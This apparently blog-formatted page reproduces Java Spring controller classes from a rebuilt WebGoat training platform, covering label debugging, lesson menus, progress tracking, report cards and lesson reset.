<h3 id="LabelDebugService"><a href="#LabelDebugService" class="headerlink" title="LabelDebugService"></a>LabelDebugService</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.LabelDebugger;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LabelDebugService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">URL_DEBUG_LABELS_MVC</span> <span class="operator">=</span> <span class="string">&quot;/service/debug/labels.mvc&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_ENABLED</span> <span class="operator">=</span> <span class="string">&quot;enabled&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_SUCCESS</span> <span class="operator">=</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> LabelDebugger labelDebugger;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(path = URL_DEBUG_LABELS_MVC,produces = MediaType.APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> ResponseEntity&lt;Map&lt;String,Object&gt;&gt; <span class="title function_">checkDebuggingStatus</span><span class="params">()</span>&#123;</span><br><span class="line">        log.debug(<span class="string">&quot;Checking label debugging,it is &#123;&#125;&quot;</span>,labelDebugger.isEnabled());</span><br><span class="line">        Map&lt;String,Object&gt; result = createResponse(labelDebugger.isEnabled());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;&gt;(result, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(value = URL_DEBUG_LABELS_MVC,produces = MediaType.APPLICATION_JSON_VALUE,params = KEY_ENABLED)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> ResponseEntity&lt;Map&lt;String,Object&gt;&gt; <span class="title function_">setDebuggingStatus</span><span class="params">(<span class="meta">@RequestParam(&quot;enabled&quot;)</span> Boolean enabled)</span>&#123;</span><br><span class="line">        log.debug(<span class="string">&quot;Setting label debugging to &#123;&#125;&quot;</span>,labelDebugger.isEnabled());</span><br><span class="line">        Map&lt;String,Object&gt; result =  createResponse(enabled);</span><br><span class="line">        labelDebugger.setEnabled(enabled);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;&gt;(result,HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,Object&gt; <span class="title function_">createResponse</span><span class="params">(Boolean enabled)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Map.of(KEY_SUCCESS,Boolean.TRUE,KEY_ENABLED,enabled);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LabelService"><a href="#LabelService" class="headerlink" title="LabelService"></a>LabelService</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.i18n.Messages;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.i18n.PluginMessages;</span><br><span class="line"><span class="keyword">import</span> lombok.RequiredArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.RequestEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LabelService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">URL_LABELS_MVC</span> <span class="operator">=</span> <span class="string">&quot;/service/labels.mvc&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Messages messages;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> PluginMessages pluginMessages;</span><br><span class="line">    <span class="meta">@GetMapping(path = URL_LABELS_MVC,produces = MediaType.APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;Properties&gt; <span class="title function_">fetchLeabels</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">allProperties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        allProperties.putAll(messages.getMessages());</span><br><span class="line">        allProperties.putAll(pluginMessages.getMessages());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;&gt;(allProperties, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LessonInfoService"><a href="#LessonInfoService" class="headerlink" title="LessonInfoService"></a>LessonInfoService</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.LessonInfoModel;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LessonInfoService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WebSession webSession;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/service/lessoninfo.mvc&quot;,produces = &quot;application/json&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> LessonInfoModel <span class="title function_">getLessonInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Lesson</span> <span class="variable">lesson</span> <span class="operator">=</span> webSession.getCurrentLesson();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LessonInfoModel</span>(lesson.getTitle(),<span class="literal">false</span>,<span class="literal">false</span>,<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LessonMenuService"><a href="#LessonMenuService" class="headerlink" title="LessonMenuService"></a>LessonMenuService</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.*;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.Course;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.LessonTracker;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.UserTracker;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.UserTrackerRepository;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.parameters.P;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LessonMenuService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">URL_LESSONMENU_MVC</span> <span class="operator">=</span> <span class="string">&quot;/service/lessonmenu.mvc&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Course course;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WebSession webSession;</span><br><span class="line">    <span class="keyword">private</span> UserTrackerRepository userTrackerRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;#&#123;&#x27;$&#123;exclude.categories&#125;&#x27;.split(&#x27;,&#x27;)&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;String &gt; excludeCategories;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;#&#123;&#x27;$&#123;exclude.lessons&#125;&#x27;.split(&#x27;,&#x27;)&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;String &gt; excludeLessons;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(path = URL_LESSONMENU_MVC,produces = &quot;application/json&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> List&lt;LessonMenuItem&gt; <span class="title function_">showLeftNav</span><span class="params">()</span>&#123;</span><br><span class="line">        List&lt;LessonMenuItem&gt; menu = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Category&gt; categories = course.getCategories();</span><br><span class="line">        <span class="type">UserTracker</span> <span class="variable">userTracker</span> <span class="operator">=</span> userTrackerRepository.findByUser(webSession.getUserName());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Category category: categories)&#123;</span><br><span class="line">            <span class="keyword">if</span> (excludeCategories.contains(category.name()))&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">LessonMenuItem</span> <span class="variable">categoryItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LessonMenuItem</span>();</span><br><span class="line">            categoryItem.setName(category.getName());</span><br><span class="line">            categoryItem.setType(LessonMenuItemType.CATEGORY);</span><br><span class="line"></span><br><span class="line">            List&lt;Lesson&gt; lessons = course.getLessons(category);</span><br><span class="line">            lessons = lessons.stream().sorted(Comparator.comparing(Lesson::getTitle)).toList();</span><br><span class="line">            <span class="keyword">for</span> (Lesson lesson:lessons)&#123;</span><br><span class="line">                <span class="keyword">if</span> (excludeLessons.contains(lesson.getName()))&#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">LessonMenuItem</span> <span class="variable">lessonItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LessonMenuItem</span>();</span><br><span class="line">                lessonItem.setName(lesson.getTitle());</span><br><span class="line">                lessonItem.setLink(lesson.getLink());</span><br><span class="line">                lessonItem.setType(LessonMenuItemType.LESSON);</span><br><span class="line">                <span class="type">LessonTracker</span> <span class="variable">lessonTracker</span> <span class="operator">=</span> userTracker.getLessonTracker(lesson);</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">lessonSolved</span> <span class="operator">=</span> lessonCompleted(lessonTracker.getLessonOverview(),lesson);</span><br><span class="line">                lessonItem.setComplete(lessonSolved);</span><br><span class="line">                categoryItem.addChild(lessonItem);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            categoryItem.getChildren().sort(((o1, o2) -&gt; o1.getRanking() - o2.getRanking()));</span><br><span class="line">            menu.add(categoryItem);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> menu;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">lessonCompleted</span><span class="params">(Map&lt;Assignment,Boolean&gt; map,Lesson currentLesson)</span>&#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Assignment,Boolean&gt; entry : map.entrySet())&#123;</span><br><span class="line">            <span class="type">Assignment</span> <span class="variable">storedAssignment</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="keyword">for</span> (Assignment lessonAssignment : currentLesson.getAssignments())&#123;</span><br><span class="line">                <span class="keyword">if</span> (lessonAssignment.getName().equals(storedAssignment.getName()))&#123;</span><br><span class="line">                    result = result &amp;&amp; entry.getValue();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="LessonProgressService"><a href="#LessonProgressService" class="headerlink" title="LessonProgressService"></a>LessonProgressService</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Assignment;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.UserTrackerRepository;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.RequiredArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LessonProgressService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserTrackerRepository userTrackerRepository;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WebSession webSession;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/service/lessonoverview.mvc&quot;,produces = &quot;application/json&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;LessonOverview&gt; <span class="title function_">lessonOverview</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">var</span>  <span class="variable">userTracker</span> <span class="operator">=</span> userTrackerRepository.findByUser(webSession.getUserName());</span><br><span class="line">        <span class="type">var</span> <span class="variable">currentLesson</span> <span class="operator">=</span> webSession.getCurrentLesson();</span><br><span class="line">        <span class="keyword">if</span> (currentLesson != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">lessonTracker</span> <span class="operator">=</span> userTracker.getLessonTracker(currentLesson);</span><br><span class="line">            <span class="keyword">return</span> lessonTracker.getLessonOverview().entrySet().stream()</span><br><span class="line">                    .map(entry -&gt; <span class="keyword">new</span> <span class="title class_">LessonOverview</span>(entry.getKey(),entry.getValue()))</span><br><span class="line">                    .toList();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> List.of();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@AllArgsConstructor</span></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">LessonOverview</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Assignment assignment;</span><br><span class="line">        <span class="keyword">private</span> Boolean solved;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="LessonTitleService"><a href="#LessonTitleService" class="headerlink" title="LessonTitleService"></a>LessonTitleService</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LessonTitleService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WebSession webSession;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LessonTitleService</span><span class="params">(<span class="keyword">final</span> WebSession webSession)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.webSession = webSession;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/service/lessontitle.mvc&quot;,produces = &quot;application/html&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> String <span class="title function_">showPlan</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Lesson</span> <span class="variable">lesson</span> <span class="operator">=</span> webSession.getCurrentLesson();</span><br><span class="line">        <span class="keyword">return</span> lesson != <span class="literal">null</span> ? lesson.getTitle() :<span class="string">&quot;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ReportCardService"><a href="#ReportCardService" class="headerlink" title="ReportCardService"></a>ReportCardService</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.i18n.PluginMessages;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.Course;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.LessonTracker;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.UserTracker;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.UserTrackerRepository;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReportCardService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WebSession webSession;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserTrackerRepository userTrackerRepository;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Course course;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> PluginMessages pluginMessages;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@GetMapping(path = &quot;/service/reportcard.mvc&quot;,produces = &quot;application/json&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> ReportCard <span class="title function_">reportCard</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ReportCard</span> <span class="variable">reportCard</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReportCard</span>();</span><br><span class="line">        reportCard.setTotalNumberOfLessons(course.getTotalOfLessons());</span><br><span class="line">        reportCard.setTotalNumberOfAssignments(course.getTotalOfAssignments());</span><br><span class="line"></span><br><span class="line">        <span class="type">UserTracker</span> <span class="variable">userTracker</span> <span class="operator">=</span> userTrackerRepository.findByUser(webSession.getUserName());</span><br><span class="line">        reportCard.setNumberOfAssignmentsSolved(userTracker.numberOfAssignmentsSolved());</span><br><span class="line">        reportCard.setNumberOfLessonsSolved(userTracker.numberOfLessonsSolved());</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (Lesson lesson : course.getLessons())&#123;</span><br><span class="line">            <span class="type">LessonTracker</span> <span class="variable">lessonTracker</span> <span class="operator">=</span> userTracker.getLessonTracker(lesson);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">LessonStatistics</span> <span class="variable">lessonStatistics</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LessonStatistics</span>();</span><br><span class="line">            lessonStatistics.setName(pluginMessages.getMessage(lesson.getTitle()));</span><br><span class="line">            lessonStatistics.setNumberOfAttempts(lessonTracker.getNumberOfAttempts());</span><br><span class="line">            lessonStatistics.setSolved(lessonTracker.isLessonSolved());</span><br><span class="line">            reportCard.lessonStatistics.add(lessonStatistics);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> reportCard;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="meta">@Setter</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ReportCard</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> totalNumberOfLessons;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> totalNumberOfAssignments;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> solvedLessons;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> numberOfAssignmentsSolved;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> numberOfLessonsSolved;</span><br><span class="line">        <span class="keyword">private</span> List&lt;LessonStatistics&gt; lessonStatistics =  <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Setter</span></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">LessonStatistics</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">boolean</span> solved;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> numberOfAttempts;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RestartLessonService"><a href="#RestartLessonService" class="headerlink" title="RestartLessonService"></a>RestartLessonService</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Initializeable;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.UserTracker;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.UserTrackerRepository;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.flywaydb.core.Flyway;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseStatus;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.function.Function;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestartLessonService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WebSession webSession;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserTrackerRepository userTrackerRepository;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Function&lt;String , Flyway&gt; flywayLessons;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Initializeable&gt; lessonsToInitialize;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/service/restartlesson.mvc&quot;,produces = &quot;text/text&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseStatus(value = HttpStatus.OK)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">restartLesson</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Lesson</span> <span class="variable">al</span> <span class="operator">=</span> webSession.getCurrentLesson();</span><br><span class="line">        log.debug(<span class="string">&quot;Restarting lesson: &quot;</span>,al);</span><br><span class="line"></span><br><span class="line">        <span class="type">UserTracker</span> <span class="variable">userTracker</span> <span class="operator">=</span> userTrackerRepository.findByUser(webSession.getUserName());</span><br><span class="line">        userTracker.reset(al);</span><br><span class="line">        userTrackerRepository.save(userTracker);</span><br><span class="line">        <span class="type">var</span> <span class="variable">flyway</span> <span class="operator">=</span> flywayLessons.apply(webSession.getUserName());</span><br><span class="line">        flyway.clean();</span><br><span class="line">        flyway.migrate();</span><br><span class="line">        lessonsToInitialize.forEach(i-&gt;i.initialize(webSession.getUser()));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

